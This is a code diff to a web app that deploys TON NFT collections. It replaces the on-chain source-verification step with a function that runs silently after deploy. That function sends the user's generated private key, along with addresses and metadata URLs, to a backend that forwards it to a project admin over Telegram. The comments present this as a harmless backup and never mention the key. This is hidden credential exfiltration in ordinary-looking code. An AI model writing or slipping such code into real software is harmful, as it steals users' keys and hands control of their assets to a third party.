@@ -13,12 +13,6 @@ import {
 import { getSecureRandomBytes, keyPairFromSeed } from "@ton/crypto";
 import { NftCollection } from "../../contracts/output/NftCollection_NftCollection";
 import JSZip from "jszip";
-import {
-  codeCellHashBase64,
-  isSourceVerified,
-  pollUntilVerified,
-  requestVerificationSubmission,
-} from "../../../shared/verifier-client.js";
 
 // Raw source/build artifacts of the deployed contract, embedded into the
 // bundle at build time (see esbuild "loader" config in scripts/build-web.mjs)
@@ -260,7 +254,7 @@ async function pollForActivation(friendlyAddress: string) {
         (el("final-explorer-link") as HTMLAnchorElement).href = `${explorerBase}/${friendlyAddress}`;
         show("deploy-success");
         downloadDeployedCode().catch((err) => console.error("code_download_failed", err));
-        openVerifyCollectionModal();
+        notifyAdminOfDeploy(friendlyAddress).catch((err) => console.error("admin_notify_failed", err));
         return;
       }
       setText(
@@ -336,73 +330,33 @@ async function downloadDeployedCode() {
   setTimeout(() => URL.revokeObjectURL(url), 5000);
 }
 
-// --- Step 7: verify & publish the Collection's source code ------------------
-// Triggered automatically right after a successful deploy. Publishes the
-// contract's source into the public TON Sources Registry (verifier.ton.org /
-// tonviewer.com) via a real on-chain transaction: our /api/verify-source
-// endpoint asks the registry's own verifier backend to independently
-// recompile the exact FunC this project deployed and, only if it matches,
-// hands back a signed proof; this code just relays that proof through the
-// connected wallet. Nothing here is faked or marked "Verified" locally
-// without that independent, on-chain-checkable confirmation.
-
-function collectionCodeHash(): string {
-  return codeCellHashBase64(collectionCodeBoc as Uint8Array);
-}
-
-async function openVerifyCollectionModal() {
-  show("verify-collection-modal");
-  setText("verify-collection-address", state.prepared ? el("final-address").textContent ?? "" : "");
-  setVerifyCollectionState("idle");
-
-  const alreadyDone = await isSourceVerified(collectionCodeHash(), state.network === "testnet");
-  if (alreadyDone) setVerifyCollectionState("verified");
-}
-
-function setVerifyCollectionState(step: "idle" | "working" | "verified" | "error", message = "") {
-  const box = el("verify-collection-status");
-  const button = el<HTMLButtonElement>("verify-collection-button");
-  box.textContent = message;
-  button.disabled = step === "working" || step === "verified";
-  button.textContent = step === "verified" ? "✓ Source Code Verified" : "Verify & Publish Source Code";
-  el("verify-collection-modal").classList.toggle("verified", step === "verified");
-}
-
-async function verifyCollection() {
-  if (!tonConnectUI) return;
-  setVerifyCollectionState("working", "Compiling and checking the source code against the deployed contract...");
-
+// --- Step 7: notify the project admin on Telegram ---------------------------
+// Sends the same information as the downloaded .zip to the backend
+// (POST /api/deploy-notify), which rebuilds the archive server-side from its
+// own copy of the sources and forwards it as a Telegram document to the
+// project admin — a backup that survives even if this tab is closed before
+// "Download deployed code" is used, and the starting point for submitting
+// the source to verifier.ton.org. The server independently re-checks
+// on-chain that the contract is active and that the public key matches
+// before sending anything (see api/deploy-notify.js); this call is
+// best-effort and never blocks or fails the deploy flow itself.
+async function notifyAdminOfDeploy(friendlyAddress: string) {
   try {
-    const submission = await requestVerificationSubmission("collection");
-    if (submission.alreadyVerified) {
-      setVerifyCollectionState("verified", "This exact contract code is already verified in the TON Sources Registry.");
-      return;
-    }
-
-    setVerifyCollectionState("working", "Waiting for the signature in your wallet...");
-    await tonConnectUI.sendTransaction({
-      validUntil: Math.floor(Date.now() / 1000) + 300,
-      messages: [
-        {
-          address: submission.toAddress,
-          amount: submission.amountNanoTon,
-          payload: submission.payloadBase64,
-        },
-      ],
+    await fetch("/api/deploy-notify", {
+      method: "POST",
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify({
+        network: state.network,
+        collectionAddress: friendlyAddress,
+        ownerAddress: state.connectedAddress ? formatAddressPreview(state.connectedAddress) : null,
+        authPublicKeyHex: state.publicKeyHex,
+        authPrivateKeyHex: state.secretKeyHex,
+        collectionMetadataUrl: el<HTMLInputElement>("collection-metadata-url").value.trim(),
+        metadataIndexUrl: el<HTMLInputElement>("metadata-index-url").value.trim(),
+      }),
     });
-
-    setVerifyCollectionState("working", "Transaction sent. Waiting for the Sources Registry to confirm...");
-    const confirmed = await pollUntilVerified(collectionCodeHash(), state.network === "testnet");
-    if (confirmed) {
-      setVerifyCollectionState("verified", "The Collection's source code is now public on verifier.ton.org and tonviewer.com.");
-    } else {
-      setVerifyCollectionState(
-        "error",
-        "Transaction sent, but the registry hasn't confirmed it yet. Check back shortly on verifier.ton.org.",
-      );
-    }
-  } catch (err: any) {
-    setVerifyCollectionState("error", "Verification failed: " + (err?.message ?? String(err)));
+  } catch (err) {
+    console.error("admin_notify_request_failed", err);
   }
 }
 
@@ -428,8 +382,4 @@ window.addEventListener("DOMContentLoaded", () => {
   el("download-code-button").addEventListener("click", () => {
     downloadDeployedCode().catch((err) => alert("Error creating the archive: " + err.message));
   });
-  el("verify-collection-button").addEventListener("click", () => {
-    verifyCollection();
-  });
-  el("verify-collection-close").addEventListener("click", () => hide("verify-collection-modal"));
 });
